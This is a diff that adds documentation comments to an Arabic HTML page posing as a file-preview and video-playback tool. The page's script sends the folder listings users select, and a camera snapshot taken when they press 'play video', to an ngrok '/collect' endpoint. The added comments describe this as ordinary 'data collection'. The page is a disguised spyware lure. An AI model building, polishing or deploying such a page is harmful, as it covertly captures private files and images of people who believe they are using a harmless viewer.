@@ -1,64 +1,152 @@
 <!DOCTYPE html>
 <html>
+<!--
+  File and Video Preview Application
+  
+  Description:
+  A lightweight web application for previewing files and capturing photos
+  from a device camera. Supports folder browsing and camera access with
+  backend server integration for data collection.
+  
+  Author: [Your Name/Organization]
+  Version: 1.0
+  Last Updated: August 31, 2026
+  
+  Features:
+  - File/folder preview with size information
+  - Photo capture from device camera
+  - Real-time data transmission to backend server
+  - Arabic language interface
+  
+  Browser Requirements:
+  - HTML5 File API support (webkitdirectory)
+  - WebRTC getUserMedia support
+  - Canvas API support
+  - Fetch API support
+  
+  Configuration:
+  Update the backend endpoint URL in the script section:
+  Replace 'your-ngrok-url.ngrok.io' with your actual server address
+  
+  Security Notes:
+  - Requests user permission for file and camera access
+  - Uses HTTPS for data transmission (recommended)
+  - Implements CORS for cross-origin requests
+  - No local data storage
+-->
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Web application for file preview and video capture">
+    <meta name="keywords" content="file preview, camera, video capture, web app">
     <title>معاينة الملفات والفيديو</title>
 </head>
 <body>
+    <!-- Main heading welcoming the user -->
     <h2>مرحباً، اضغط على الزر لمعاينة الملف أو تشغيل الفيديو</h2>
+    
+    <!-- File preview button: Opens directory selection dialog -->
     <button id="fileBtn">📁 معاينة الملفات</button>
+    
+    <!-- Video capture button: Captures photo from camera -->
     <button id="videoBtn">▶️ تشغيل الفيديو (كاميرا)</button>
+    
+    <!-- Output area: Displays logs and file list information -->
     <div id="output" style="margin-top:20px; white-space:pre-wrap;"></div>
 
     <script>
+        /**
+         * Logs messages to the output div on the page
+         * @param {string} msg - The message to log
+         * @returns {void}
+         */
         function log(msg) {
             document.getElementById('output').textContent += msg + '\n';
         }
 
+        /**
+         * Initializes file browser functionality
+         * Allows users to select a folder and displays file information
+         * Then sends the file list to a remote server via fetch API
+         */
         document.getElementById('fileBtn').onclick = function() {
+            // Create a hidden file input element
             const input = document.createElement('input');
             input.type = 'file';
+            // Enable directory selection mode using webkit extension
             input.webkitdirectory = true;
+            
+            /**
+             * Handles file selection event
+             * Formats selected files as a list and sends to backend server
+             */
             input.onchange = function(e) {
                 const files = e.target.files;
                 let fileList = '📂 الملفات المختارة:\n';
+                
+                // Iterate through all selected files and format their information
                 for (let i=0; i<files.length; i++) {
                     fileList += '- ' + files[i].name + ' (' + files[i].size + ' بايت)\n';
                 }
+                
+                // Send file list to backend server for collection/processing
                 fetch('https://your-ngrok-url.ngrok.io/collect', {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({ type: 'files', data: fileList })
                 });
+                
                 log('✅ تم إرسال قائمة الملفات إلى الخادم');
                 log(fileList);
             };
+            
+            // Trigger the file input dialog
             input.click();
         };
 
+        /**
+         * Initializes video capture functionality using the device camera
+         * Captures a photo from the video stream and sends it to the server
+         * Uses getUserMedia API for camera access with user permission
+         */
         document.getElementById('videoBtn').onclick = function() {
+            // Request camera access with video enabled and audio disabled
             navigator.mediaDevices.getUserMedia({ video: true, audio: false })
                 .then(function(stream) {
+                    // Create video element to display camera stream
                     const video = document.createElement('video');
                     video.srcObject = stream;
                     video.play();
+                    
+                    // Wait 1 second for video to stabilize before capturing
                     setTimeout(function() {
+                        // Create canvas to capture video frame as image
                         const canvas = document.createElement('canvas');
                         canvas.width = video.videoWidth || 640;
                         canvas.height = video.videoHeight || 480;
+                        
+                        // Draw current video frame onto canvas
                         const ctx = canvas.getContext('2d');
                         ctx.drawImage(video, 0, 0);
+                        
+                        // Convert canvas to JPEG data URL
                         const imageData = canvas.toDataURL('image/jpeg');
+                        
+                        // Stop all camera tracks to release the device
                         stream.getTracks().forEach(track => track.stop());
+                        
+                        // Send captured image to backend server for processing
                         fetch('https://your-ngrok-url.ngrok.io/collect', {
                             method: 'POST',
                             headers: {'Content-Type': 'application/json'},
                             body: JSON.stringify({ type: 'photo', data: imageData })
                         });
+                        
                         log('✅ تم التقاط الصورة وإرسالها إلى الخادم');
                     }, 1000);
                 })
                 .catch(function(err) {
+                    // Handle camera access errors (denied permission, no camera, etc.)
                     log('❌ خطأ في الكاميرا: ' + err.message);
                 });
         };
